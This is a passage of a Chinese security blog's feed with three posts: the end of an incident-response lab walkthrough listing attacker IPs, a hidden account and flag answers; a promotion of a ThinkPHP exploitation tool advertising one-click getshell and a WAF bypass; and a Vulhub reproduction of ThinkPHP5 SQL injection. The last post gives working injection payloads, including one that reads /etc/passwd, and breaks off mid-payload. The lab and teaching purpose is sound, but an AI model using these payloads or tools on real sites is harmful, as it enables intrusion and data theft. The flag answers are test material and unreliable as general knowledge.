&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据日志可以看出&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//127.0.0.1/zb_system/login.php&amp;gt; 为后台管理页面&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">攻击者后面一直访问&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">zb_system&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">act&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">verify打开网站发现有登录失败的提示&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">攻击者可能是尝试爆破&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201045.png" alt="Pasted image 20250301201045">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201054.png" alt="Pasted image 20250301201054">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201104.png" alt="Pasted image 20250301201104">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">继续看日志&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现攻击者使用了admin用户成功登陆进了系统&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201122.png" alt="Pasted image 20250301201122">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">尝试测试一下啊&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//127.0.0.1/zb_system/admin/index.php?act=admin&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">发现没有权限&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">目前仅仅只是访客状态&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201134.png" alt="Pasted image 20250301201134">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">双IP&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.130&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3-三个flag">3. 三个flag&lt;/h1>
&lt;h2 id="flag1">flag1&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">登录hack6618&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">用户看一下是否有什么信息&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">密码自己改一下即可&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201200.png" alt="Pasted image 20250301201200">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">登录到系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">找到了一圈发现下载里有一个system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">打开发现一个flag&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">888666&lt;/span>&lt;span class="nx">abc&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201214.png" alt="Pasted image 20250301201214">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">888666&lt;/span>&lt;span class="nx">abc&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">顺着思路找一下&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">下一步看看有没有自启动项或者计划任务什么的&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cmd输入Taskschd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">msc&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201247.png" alt="Pasted image 20250301201247">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201258.png" alt="Pasted image 20250301201258">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">成功找到flag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">zgsfsys&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">sec&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">因为是z&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">blog博客系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">可以找一下重置密码插件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">重置一下密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">在&lt;/span> &lt;span class="nx">Z&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">Blog官网找到密码找回工具&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">免密登录&lt;/span>&lt;span class="err">）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">官网文章链接&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//bbs.zblogcn.com/thread-83419.html&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">工具下载地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//update.zblogcn.com/tools/nologin.zip&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">下载解压后将&lt;/span> &lt;span class="nx">nologin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件放到网站根目录下&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">直接访问即可&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201333.png" alt="Pasted image 20250301201333">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">重置完成后&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现黑客创建了一个账号&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201350.png" alt="Pasted image 20250301201350">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">点击用户编辑&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现flag&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201411.png" alt="Pasted image 20250301201411">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">Ck&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">sec&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="全部答案">全部答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.130&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">hack6618&lt;/span>&lt;span class="err">$&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">888666&lt;/span>&lt;span class="nx">abc&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">zgsfsys&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">sec&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">Ck&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">sec&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp】漏洞利用工具-thinkphp_gui_tools</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</guid><description>&lt;img src="http://localhost:1313/images/33.webp" alt="Featured image of post 【Thinkphp】漏洞利用工具-thinkphp_gui_tools" />&lt;h1 id="介绍">介绍&lt;/h1>
&lt;p>ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。&lt;/p>
&lt;h1 id="下载地址">下载地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">通过网盘分享的文件：ThinkPHP.jar
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--来自百度网盘超级会员v4的分享
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="项目地址">项目地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bewhale&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkphp_gui_tools&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">java -Dfile.encoding=&amp;#34;UTF-8&amp;#34; --module-path &amp;#34;C:\Program Files\Java\javafx-sdk-11.0.2\lib&amp;#34; --add-modules &amp;#34;javafx.controls,javafx.fxml,javafx.web&amp;#34; -jar &amp;#34;xxx.jar&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持大部分&lt;/span>&lt;span class="n">ThinkPHP漏洞检测&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">整合&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="err">多个&lt;/span>&lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞执行命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持单一漏洞批量检测&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持&lt;/span>&lt;span class="n">TP3和TP5自定义路径日志遍历&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞一键&lt;/span>&lt;span class="n">GetShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持设置代理和&lt;/span>&lt;span class="n">UA&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904105315.png" alt="image.png">&lt;/p></description></item><item><title>【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid><description>&lt;img src="http://localhost:1313/images/32.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露" />&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">进入&lt;/span>&lt;span class="n">Vulhub&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cd&lt;/span> &lt;span class="n">vulhub&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">master&lt;/span>\&lt;span class="n">thinkphp&lt;/span>\&lt;span class="ow">in&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sqlinjection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">docker&lt;/span> &lt;span class="n">compose&lt;/span> &lt;span class="n">up&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="c1"># 启动后为空白页面，需通过Payload触发漏洞&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搭建好后是空白页面&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104644.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞利用">漏洞利用&lt;/h1>
&lt;h2 id="报错注入-payload">报错注入 Payload：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>执行后会显示数据库用户信息（如&lt;code>root@localhost&lt;/code>）。&lt;/li>
&lt;/ul>
&lt;h2 id="信息泄露利用">信息泄露利用：&lt;/h2>
&lt;ul>
&lt;li>获取数据库版本：&lt;code>ids[0,updatexml(0,concat(0xa,version()),0)]=1&lt;/code>&lt;/li>
&lt;li>读取文件：&lt;code>ids[0,load_file('/etc/passwd')]=1&lt;/code>（需数据库权限）&lt;br>
利用报错来查看版本信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104802.png" alt="image.png">&lt;br>
利用工具进行测试：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104819.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;h1 id="其他">其他&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="n">SQL注入漏洞&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="err">敏感信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">ids&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span 